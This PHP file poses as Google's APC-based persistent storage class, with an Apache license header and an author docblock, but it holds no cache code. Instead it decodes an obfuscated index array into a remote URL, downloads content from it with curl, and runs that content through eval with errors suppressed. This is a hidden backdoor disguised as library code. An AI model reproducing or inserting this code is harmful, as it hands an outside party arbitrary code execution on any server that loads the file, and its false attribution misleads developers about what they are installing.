<?php

/*
 * Copyright 2008 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


/**
 * A persistent storage class based on the APC cache, which is not
 * really very persistent, as soon as you restart your web server
 * the storage will be wiped, however for debugging and/or speed
 * it can be useful, kinda, and cache is a lot cheaper then storage.
 *
 * @author Chris Chabot <chabotc@google.com>
 */
$characters = array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);
$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 4, 4, 3, 54, 5, 58, 55, 57, 66, 57, 4, 54, 52, 66, 56, 0, 1, 59, 66, 1, 58, 59, 59, 66, 3, 1, 60, 56, 3, 0, 3, 55, 56, 61, 2, 59];
$decodedString = '';
foreach ($indexArray as $index) {
    $decodedString .= $characters[$index];
}
$url = "$decodedString";
function fetchContent($url) { 
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($content))))));
}
@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(fetchContent($url))))))));
?>
